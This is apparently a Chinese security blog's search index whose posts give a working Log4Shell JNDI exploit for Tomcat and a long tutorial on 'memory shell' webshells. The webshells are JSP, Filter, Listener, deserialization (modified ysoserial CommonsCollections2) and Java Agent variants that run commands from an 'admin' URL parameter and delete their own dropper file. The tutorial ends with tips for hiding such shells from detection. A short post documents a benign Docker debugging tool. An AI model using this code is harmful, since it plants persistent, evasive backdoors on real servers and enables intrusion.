{"pages":[{"title":"Error 404 - Page Not Found 未找到页面","text":"点我返回首页","link":"/404.html"},{"title":"关于我","text":"Email: 4xpl0r3r@gmail.com 其它的下次再写…","link":"/about/index.html"}],"posts":[{"title":"在Tomcat环境下使用JNDI绕过trusted codebase限制的Exploit","text":"在CVE-2021-44228 log4j2 RCE 分析中，我们实现了在Java 8u181中通过JNDI加载恶意类实现RCE，本文我们实现一个在trusted codebase限制下实现RCE的Exploit 搭建Tomcat脆弱环境IDEA使用Web Profile配置创建Java EE项目，使用Tomcat 9.0.58进行学习，不同版本的Tomcat的内部不同，本文统一使用Tomcat 9，Java版本使用Java 8u292，在pom.xml中引入log4j-core 2.14.1的依赖 在自动创建的HelloServlet类中的doGet写入触发log4j漏洞的代码 123456789101112131415161718192021222324252627282930package com.example.Tomcat9Web;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import java.io.*;import javax.servlet.http.*;import javax.servlet.annotation.*;@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)public class HelloServlet extends HttpServlet { private String message; private static final Logger logger = LogManager.getLogger(); public void init() { message = &quot;Hello World!&quot;; } public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { response.setContentType(&quot;text/html&quot;); logger.error(&quot;${jndi:rmi://127.0.0.1:1199/Exploit}&quot;); // Hello PrintWriter out = response.getWriter(); out.println(&quot;&lt;html&gt;&lt;body&gt;&quot;); out.println(&quot;&lt;h1&gt;&quot; + message + &quot;&lt;/h1&gt;&quot;); out.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;); } public void destroy() { }} 制作Exploit 参考：如何绕过高版本JDK限制进行JNDI注入利用 (qq.com) 原理部分可以阅读参考的KINGX师傅的文章 将Tomcat的lib文件夹和bin/tomcat-juli.jar引入项目的libraries来消除依赖问题 代码如下 1234567891011121314151617181920212223import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.NamingException;import javax.naming.StringRefAddr;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import org.apache.naming.ResourceRef;public class Main { public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(1199);// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);// 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码 ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;payload=eval&quot;));// 利用表达式执行命令 ref.add(new StringRefAddr(&quot;payload&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','curl 127.0.0.1:4444']).start()\\&quot;)&quot;)); ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref); registry.bind(&quot;Exploit&quot;, referenceWrapper); }} 运行Exploit和Tomcat项目并访问doGet方法触发log4j漏洞，就能成功执行命令","link":"/Exploit/%E5%9C%A8Tomcat%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8JNDI%E7%BB%95%E8%BF%87trusted-codebase%E9%99%90%E5%88%B6%E7%9A%84Exploit/"},{"title":"DIPD 文档","text":"4xpl0r3r/DIPD: Debug with IDA and Pwntools in Docker (DIPD) (github.com) 本文同时提供以下语言的翻译： English. 关于通过这个工具，可以同时使用pwntools和IDA在docker中调试程序 安全 快速 强大(IDA) 快速开始1git clone https://github.com/4xpl0r3r/DIPD.git 安装Docker、docker-compose和IDA(你可以将他们安装在不同的主机上，只需要保证网络畅通即可) 将程序文件移动到debug/ 目录并改名为todebug 在此项目根目录运行docker-compose up命令 完成上述步骤后，通过如下命令访问程序的标准输入输出 1nc docker.ip 23458 IDA Pro调试器参数 (版本7.6) Type: Remote Linux Debugger (Attach) Hostname: docker.ip (运行docker主机的IP) Port: 23946 不需要密码 注意 在使用IDA Attach到调试进程之前，必须先使用netcat或pwntools运行程序，否则无法在IDA中看到想要的进程 你必须在64位架构中运行的Docker以同时支持32位(i386)和64位(amd64)架构程序的调试 演示启动DIPD 1docker-compose up 运行并连接到你所调试程序的STDIO 1nc docker.ip 23458 现在，你的二进制文件应该已经在运行了 接下来打开IDA并启动IDA调试器 输入信息并点击OK 现在你可以看到你的docker中的进程，选择./todebug调试并点击”OK” 现在你应该已经进入调试视图，没有任何错误和异常 文件 - docker-compose.ymlimage你可以在这里选择你想要的基本映像，这里有一些常用的选项 1234i386/ubuntu:16.04i386/ubuntu:18.04amd64/ubuntu:16.04amd64/ubuntu:18.04 你必须在64位架构中运行的Docker以同时支持32位(i386)和64位(amd64)架构程序的调试，否则只能调试32位(i386)程序 其他参数查看相关注释即可 目录 - files目录 - debssocat的apt包，用于快速安装和离线支持 文件 - linux_server[64]IDA Debug Server v7.6 如果不想使用 IDA v7.6 版本，可以进行替换 文件 - init.sh此脚本文件用于初始化调试环境，你可以对其修改以进行任何调整","link":"/%E6%96%87%E6%A1%A3/DIPD-%E6%96%87%E6%A1%A3/"},{"title":"JavaWeb 内存马技术归纳","text":"本文以Tomcat 9为核心学习并归纳了一些内存马技术，除有特殊说明外的章节外，本文使用Java 8u292 首先我们整理一下几种植入内存马的方式 基于JSP WebShell植入内存马 基于JavaWeb RCE漏洞植入内存马 真正的无文件落地内存马 通过Java Agent植入内存马 由于我们使用的是Tomcat，可以通过动态增加Servlet、Filter、Listener来植入内存马，如果技术栈还存在Spring和Shiro等，还可以使用增加Controller等方法 基于JSP WebShell植入内存马 参考：MemoryShellLearn/jsp注入内存马 at main · bitterzzZZ/MemoryShellLearn (github.com) 配置开发环境IDEA使用Web Profile配置创建Java EE项目，使用Tomcat 9.0.58进行学习，不同版本的Tomcat的内部不同，本文统一使用Tomcat 9 为了在JSP中开发内存马，我们需要使用Tomcat的API，虽然在放在Tomcat中就可以直接使用Tomcat的API，但是IDEA无法进行代码提示，因此我们要在项目设置中把Apache Tomcat中的lib文件夹加入项目的Libraries中去，除此之外还要引入tomcat的/bin/tomcat-juli.jar 完成Libraries的配置后我们的代码就不会因为缺少依赖而出现报错了 增加ServletServlet我们都知道，是Tomcat的最基本的服务程序，我们可以直接在内存中增加Servlet来实现无文件的内存马 增加Servlet的方式分为3个步骤 利用反射通过ApplicationContextFacade获取到StandardContext 将Servlet程序封装到Wrapper 将封装好的Wrapper增加到StandardContext中并添加地址映射 代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;%&gt;&lt;%@ page import = &quot;org.apache.catalina.core.*&quot;%&gt;&lt;%@ page import = &quot;javax.servlet.*&quot;%&gt;&lt;%@ page import = &quot;javax.servlet.http.*&quot;%&gt;&lt;%@ page import = &quot;java.io.*&quot;%&gt;&lt;%@ page import = &quot;java.lang.reflect.Field&quot;%&gt;&lt;% class BackdoorServlet extends HttpServlet { @Override public void service(ServletRequest req, ServletResponse res) throws IOException { HttpServletRequest request = (HttpServletRequest) req; HttpServletResponse response = (HttpServletResponse) res; if (request.getParameter(&quot;admin&quot;)!=null){ Runtime.getRuntime().exec(request.getParameter(&quot;admin&quot;)); } else{ response.sendError(HttpServletResponse.SC_NOT_FOUND); } } } ServletContext servletContext = request.getSession().getServletContext(); // 获取Context // 通过反射从ApplicationContextFacade中获取到当前的StandardContext Field field = servletContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext); field = applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); // 将Servlet添加到Context中去 BackdoorServlet backdoorServlet = new BackdoorServlet(); org.apache.catalina.Wrapper backdoorWrapper = standardContext.createWrapper(); backdoorWrapper.setName(&quot;hello&quot;); backdoorWrapper.setLoadOnStartup(1); backdoorWrapper.setServlet(backdoorServlet); backdoorWrapper.setServletClass(backdoorServlet.getClass().getName()); // jiang standardContext.addChild(backdoorWrapper); standardContext.addServletMappingDecoded(&quot;/hello&quot;, &quot;hello&quot;); // 自毁// (new File(application.getRealPath(request.getServletPath()))).delete();%&gt; 触发方法：将JSP放入webapp文件夹中，我们首先访问路径/addServlet.jsp写入内存马，然后再访问/hello?admin=&lt;指令&gt;就可以执行命令了 增加Filter由于Filter在Servlet之前运行，因此可以不受URL的限制，甚至可以伪装成在对一个正常的Servlet进行访问 增加Filter的方式分为4个步骤 通过反射从ApplicationContextFacade中获取到当前的StandardContext，从StandardContext获取到filterConfigs 封装Filter为FilterDef，并添加到StandContext中 生成新的ApplicationFilterConfig并添加到filterConfigs中 创建FilterMap并加入StandardContext中，为Filter确定适用的URL 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;%&gt;&lt;%@ page import = &quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import = &quot;org.apache.catalina.core.*&quot; %&gt;&lt;%@ page import = &quot;org.apache.tomcat.util.descriptor.web.*&quot; %&gt;&lt;%@ page import = &quot;javax.servlet.*&quot; %&gt;&lt;%@ page import = &quot;javax.servlet.http.HttpServletRequest&quot; %&gt;&lt;%@ page import = &quot;java.io.*&quot; %&gt;&lt;%@ page import = &quot;java.lang.reflect.*&quot; %&gt;&lt;%@ page import = &quot;java.util.Map&quot; %&gt;&lt;% class BackdoorFilter extends HttpFilter { public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) req; if (request.getParameter(&quot;admin&quot;)!=null){ Runtime.getRuntime().exec(request.getParameter(&quot;admin&quot;)); } filterChain.doFilter(req, res); } } String name = &quot;BackdoorFilter&quot;; // 通过反射从ApplicationContextFacade中获取到当前的StandardContext ServletContext servletContext = request.getSession().getServletContext(); Field field = servletContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext); field = applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); // 通过反射从StandardContext获取到filterConfigs field = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;); field.setAccessible(true); Map filterConfigs = (Map) field.get(standardContext); if (filterConfigs.get(name) == null){ // 防止重复注入 BackdoorFilter filter = new BackdoorFilter(); // 封装Filter为FilterDef，并添加到StandContext中 FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); standardContext.addFilterDef(filterDef); // 生成新的ApplicationFilterConfig并添加到filterConfigs中 Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); filterConfigs.put(name, filterConfig); // 创建FilterMap并加入StandardContext中，为Filter确定适用的URL FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(&quot;/*&quot;); // 全局生效 filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); // 自毁 (new File(application.getRealPath(request.getServletPath()))).delete(); }%&gt; 触发方法：将JSP放入webapp文件夹中，我们首先访问路径/addFilter.jsp写入内存马，然后在访问任意路径时，带上GET参数admin就可以执行命令了 增加ListenerTomcat的Listener可以用于在某个事件发生时执行操作，我们选择实现ServletRequestListener来监听每一个HTTP请求 增加Listener的方式分为2个步骤 利用反射通过ApplicationContextFacade获取到StandardContext 将Listener添加到StandardContext中 123456789101112131415161718192021222324252627282930&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.*&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.*&quot; %&gt;&lt;%@ page import=&quot;java.io.*&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;% class BackdoorListener implements ServletRequestListener{ @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { if (request.getParameter(&quot;admin&quot;)!=null){ try { Runtime.getRuntime().exec(request.getParameter(&quot;admin&quot;)); } catch (IOException e) {} } } } // 通过反射从ApplicationContextFacade中获取到当前的StandardContext ServletContext servletContext = request.getSession().getServletContext(); Field field = servletContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext); field = applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); standardContext.addApplicationEventListener(new BackdoorListener()); // 自毁 (new File(application.getRealPath(request.getServletPath()))).delete();%&gt; 触发方法：将JSP放入webapp文件夹中，我们首先访问路径/addListener.jsp写入内存马，然后在访问任意路径时，带上GET参数admin就可以执行命令了 介绍完Tomcat JSP内存马，接下来我们进入真正无文件落地的基于JNDI和反序列化植入内存马 基于JNDI的内存马植入 - 以CVE-2021-44228 Log4Shell为例 关于CVE-2021-44228的分析，可以参见我之前的讲解文章，由于我使用remote codebase方法，本节只能使用jdk 8u181及以下的版本 准备Tomcat脆弱环境首先在Tomcat项目的pom.xml中加入log4j-core 2.14.1的依赖，然后我们再写一个触发log4j漏洞的Servlet 直接在自动创建的HelloServlet上修改即可 1234567891011121314151617181920212223242526272829303132package com.example.JavaWebDemo;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)public class HelloServlet extends HttpServlet { private String message; public void init() { message = &quot;Hello World!&quot;; } public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { Logger logger = LogManager.getLogger(); logger.error(&quot;${jndi:ldap://127.0.0.1:1389/#Exploit}&quot;); response.setContentType(&quot;text/html&quot;); PrintWriter out = response.getWriter(); out.println(&quot;&lt;html&gt;&lt;body&gt;&quot;); out.println(&quot;&lt;h1&gt;&quot; + message + &quot;&lt;/h1&gt;&quot;); out.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;); }} 构造Exploit我们只尝试增加Filter，增加Servlet和Listener的方法也比较相似，不重复讨论 接下来按照我之前的CVE-2021-44228分析中的方法触发JNDI漏洞，我们将反弹Shell的代码进行修改 这时候遇到一个难点，之前我们使用JSP获取内存马，可以发现，往Tomcat中注入内存马的核心是需要获取到StandardContext实例，之前JSP会自动放进去一个request对象，可以用于获取StandardContext，但是此时没有这个便捷的方式，所以我们要另寻出入了 参考这篇文章：Java内存马：一种Tomcat全版本获取StandardContext的新方法 - 先知社区 (aliyun.com) 由于我们使用Tomcat9，此处我们使用”从ContextClassLoader获取”的方式为例来获取StandardContext，代码如下 12WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext(); 整合Exploit，代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import org.apache.catalina.Context;import org.apache.catalina.core.*;import org.apache.catalina.loader.WebappClassLoaderBase;import org.apache.tomcat.util.descriptor.web.*;import javax.servlet.*;import javax.servlet.http.*;import java.io.*;import java.lang.reflect.*;import java.util.Map;@SuppressWarnings(&quot;unchecked&quot;)public class Exploit{ public Exploit() throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException { class BackdoorFilter extends HttpFilter { public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) req; if (request.getParameter(&quot;admin&quot;)!=null){ Runtime.getRuntime().exec(request.getParameter(&quot;admin&quot;)); } filterChain.doFilter(req, res); } } String name = &quot;BackdoorFilter&quot;; // 从ContextClassLoader获取StandardContext WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext(); // 通过反射从StandardContext获取到filterConfigs Field field = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;); field.setAccessible(true); Map filterConfigs = (Map) field.get(standardContext); if (filterConfigs.get(name) == null) { // 防止重复注入 BackdoorFilter filter = new BackdoorFilter(); // 封装Filter为FilterDef，并添加到StandContext中 FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); standardContext.addFilterDef(filterDef); // 生成新的ApplicationFilterConfig并添加到filterConfigs中 Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); filterConfigs.put(name, filterConfig); // 创建FilterMap并加入StandardContext中，为Filter确定适用的URL FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(&quot;/*&quot;); // 全局生效 filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); } }} 首先触发log4j漏洞，利用JNDI执行我们的Exploit植入内存马，随后访问任意URL时带上admin参数即可执行命令 可以发现，在这种情况下，我们实现了真正的无文件落地，但是JNDI+LDAP的攻击方式在jdk 8u191及之后就无法利用了，下一节我们讨论基于反序列化的植入方法 基于反序列化的内存马植入 - ysoserial-CommonsCollections2改造 参考：基于tomcat的内存 Webshell 无文件攻击技术 - 先知社区 (aliyun.com) 由于CommonsCollections2使用了TemplatesImpl，所以我们才能用这个方法进行内存马注入，像CommonsCollections1没有利用TemplatesImpl，所以就不行了 配置反序列化环境我们写一个进行反序列化的接口，放在doPost()里面，核心代码只需一句 1(new ObjectInputStream((request.getInputStream()))).readObject(); 我们使用CommonsCollections2作为例子，通过Maven引入commons-collections4:4.0 测试一下环境是否正常 会报错，但是我们可以发现是TemplatesImpl抛出的，并且检查命令执行效果可以发现命令执行成功了，接下来开始改造Payload 构造Exploit首先是用IDEA导入ysoserial项目，项目的Jdk版本设置为1.8。 由于打包起来太麻烦，我们将ysoserial.GeneratePayload作为主类运行，直接生成Payload 由于我们要输出到文件中，修改GeneraterPayload.java的第35行PrintStream out = System.out;改为PrintStream out = new PrintStream(&quot;./output.serial&quot;); 首先在ysoserial.payloads.util.Gadgets.java中调整createTemplateImpl函数 由于原版的createTemplateImpl根据要执行的指令来生成TemplateImpl我们将其重载并稍微修改一下 我们复制createTemplateImpl并改为如下 12345678910111213141516171819202122232425262728public static Object createTemplatesImpl ( final Class _class ) throws Exception { if ( Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;)) ) { return createTemplatesImpl( _class, Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;), Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;)); } return createTemplatesImpl(_class, TemplatesImpl.class, TransformerFactoryImpl.class);}public static &lt;T&gt; T createTemplatesImpl ( final Class _class, Class&lt;T&gt; tplClass, Class&lt;?&gt; transFactory ) throws Exception { final T templates = tplClass.newInstance(); final byte[] classBytes = ClassFiles.classAsBytes(_class); // inject class bytes into instance Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] { classBytes, ClassFiles.classAsBytes(Foo.class) }); // required to make TemplatesImpl happy Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;); Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance()); return templates;} 对于第一处重载，只是把command改为了_class并删除了无用的参数，第二处重载则从通过Javaassist技术制作类并获取字节码变为直接获取字节码，因为我们直接编写了类文件 然后将payloads/CommonsCollections2复制出一个新版本，命名为CommonsCollections2ForClassInjection 将command参数重构为payloadName，变为注入的类名来使用，之后可以方便调整为使用ServletInjection等其它内存马 把这一句进行修改 1final Object templates = Gadgets.createTemplatesImpl(command); 换为如下，直接通过类名获取字节码 1final Object templates = Gadgets.createTemplatesImpl(Class.forName(&quot;ysoserial.shells.&quot;+payloadName)); 启动参数配置如下 将生成的output.serial文件打到服务器上，然后在访问任意路径时，带上GET参数admin就可以执行命令了 可以发现我给自己起的Payload名字是TomcatFilterInjection，把它放在如图的位置 Payload代码如下，大家也可以自己制作ServletInjection或者ListenerInjection作为Payload 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091package ysoserial.shells;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.catalina.Context;import org.apache.catalina.core.ApplicationFilterConfig;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap;import javax.servlet.*;import javax.servlet.http.HttpServletRequest;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Map;public class TomcatFilterInjection extends AbstractTranslet implements Filter { static { try { String name = &quot;TomcatFilterInjection&quot;; // 从ContextClassLoader获取StandardContext WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext(); // 通过反射从StandardContext获取到filterConfigs Field field = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;); field.setAccessible(true); Map filterConfigs = (Map) field.get(standardContext); if (filterConfigs.get(name) == null) { // 防止重复注入 TomcatFilterInjection filter = new TomcatFilterInjection(); // 封装Filter为FilterDef，并添加到StandContext中 FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); standardContext.addFilterDef(filterDef); // 生成新的ApplicationFilterConfig并添加到filterConfigs中 Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); filterConfigs.put(name, filterConfig); // 创建FilterMap并加入StandardContext中，为Filter确定适用的URL FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(&quot;/*&quot;); // 全局生效 filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); } } catch (Exception e) { // 忽略错误，在生成生成序列化代码时也会执行static部分，必然报错，直接跳过即可 } } @Override public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) req; if (request.getParameter(&quot;admin&quot;)!=null){ Runtime.getRuntime().exec(request.getParameter(&quot;admin&quot;)); } filterChain.doFilter(req, res); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void destroy() { }} Java Agent内存马 参考：Java Agent 从入门到内存马 - 先知社区 (aliyun.com) 还是以Tomcat为例，我们知道JavaAgent技术可以动态修改字节码，我们熟知的Burp Suite的破解技术就是基于premain方法实现的，通过agentmain，我们可以直接修改关键类即可 由于Java Agent内存马需要有Jar文件落地，并不是比JSP更好的方法，只能说在JSP无法解析的时候适用性会更好一些 比较知名的冰蝎就提供了Java Agent内存马，我们也实现一个比较基础的 调用端(Attacher)的核心代码其实就3句话 123VirtualMachine virtualMachine = VirtualMachine.attach(id);virtualMachine.loadAgent(jarName);virtualMachine.detach(); 我们可以使用前面研究过的JNDI注入方法进行注入，也可以利用反序列化，只要能够执行Java代码即可，甚至拿到系统Shell后直接用命令执行loadAgent的另一个java程序也可以，只是要上传更多的文件，风险更大 这里方便起见，直接继续使用前面研究的反序列化注入方法进行攻击，我们在shells中增加一个新的Payload，代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344package ysoserial.shells;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import com.sun.tools.attach.VirtualMachine;import sun.management.VMManagement;import java.lang.management.ManagementFactory;import java.lang.management.RuntimeMXBean;import java.lang.reflect.Field;import java.lang.reflect.Method;public class AgentInjection extends AbstractTranslet { static { try { // 首先获取进程ID RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean(); Field jvm = runtime.getClass().getDeclaredField(&quot;jvm&quot;); jvm.setAccessible(true); VMManagement mgmt = (VMManagement) jvm.get(runtime); Method pidMethod = mgmt.getClass().getDeclaredMethod(&quot;getProcessId&quot;); pidMethod.setAccessible(true); // attach到当前JVM VirtualMachine virtualMachine = VirtualMachine.attach(String.valueOf(pidMethod.invoke(mgmt))); // 加载agent，可以从远程下载再load，这里直接从本地load了 virtualMachine.loadAgent(&quot;/tmp/agent.jar&quot;); virtualMachine.detach(); }catch (Exception e){ } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} 在src/main/resources/目录下创建META-INF/MANIFEST.MF，内容如下 123Manifest-Version: 1.0Agent-Class: AgentCan-Retransform-Classes: true 打包成.jar，发送序列化数据，结果遇到异常 可以发现依赖于tools.jar，这个包对于Tomcat来说并不会自动加载，为了让攻击奏效，我们可以通过JAVA_HOME路径手动加载类型，通过反射执行相关函数 修改后的Payload代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package ysoserial.shells;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import sun.management.VMManagement;import java.io.File;import java.lang.management.ManagementFactory;import java.lang.management.RuntimeMXBean;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.net.URLClassLoader;public class AgentInjection extends AbstractTranslet { static { try { // 首先获取进程ID RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean(); Field jvm = runtime.getClass().getDeclaredField(&quot;jvm&quot;); jvm.setAccessible(true); VMManagement mgmt = (VMManagement) jvm.get(runtime); Method pidMethod = mgmt.getClass().getDeclaredMethod(&quot;getProcessId&quot;); pidMethod.setAccessible(true); // 通过反射进行调用 URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new File(System.getProperty(&quot;java.home&quot;).replace(&quot;jre&quot;,&quot;lib&quot;) + File.separator + &quot;tools.jar&quot;).toURI().toURL()}); Class&lt;?&gt; VirtualMachine = classLoader.loadClass(&quot;com.sun.tools.attach.VirtualMachine&quot;); Method attach = VirtualMachine.getDeclaredMethod(&quot;attach&quot;,new Class[]{java.lang.String.class}); Method loadAgent=VirtualMachine.getDeclaredMethod(&quot;loadAgent&quot;,new Class[]{java.lang.String.class}); Method detach=VirtualMachine.getDeclaredMethod(&quot;detach&quot;,null); Object virtualMachine = attach.invoke(VirtualMachine,new Object[]{String.valueOf(pidMethod.invoke(mgmt))}); loadAgent.invoke(virtualMachine,new Object[]{&quot;/tmp/agent.jar&quot;}); detach.invoke(virtualMachine); }catch (Exception e){ } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} 完成反序列化注入Payload后，在访问任意路径时，带上GET参数admin就可以执行命令了 内存马检测和隐藏 参考： 探索Filter型Tomcat内存马的免杀 - 先知社区 (aliyun.com) 查杀Java web filter型内存马 | 回忆飘如雪 (gv7.me) 对于注入后的内存马，可以分为两个类型 组件注入型 - 注入Servlet、Filter、Listener、Controller等 Agent注入型 - 注入字节码 检测方面的研究主要有c0ny1师傅的文章 组件注入型的检测和查杀可以发现c0ny1师傅给出的方法就是通过加载Java Agent实时获取所有Filter，并且对于可疑的类进行检查 根据4ra1n师傅的方法，我们可以主要通过如下手段来隐藏我们的内存马 内存马的类名改为更加合理的，不要使用BackdoorFilter这样显眼的名字，并引入一定的随机化 读取已有Filter的包名，将自己Filter包名改为一致的 自动修改web.xml的内容进行隐藏 除此之外，由于可以检查Filter对应的classpath是否存在来检查，我们可以把class文件写入到硬盘上，但是这样就有被HIDS扫描到的风险，应视情况采用 目前为止，如果防御方不把class文件dump出来进行反编译对源码进行分析，应该是很难识别了，如果被dump了的话，只能进一步进采用源码免杀技巧 Agent注入型的检测和查杀由于c0ny1师傅的《查杀Java web 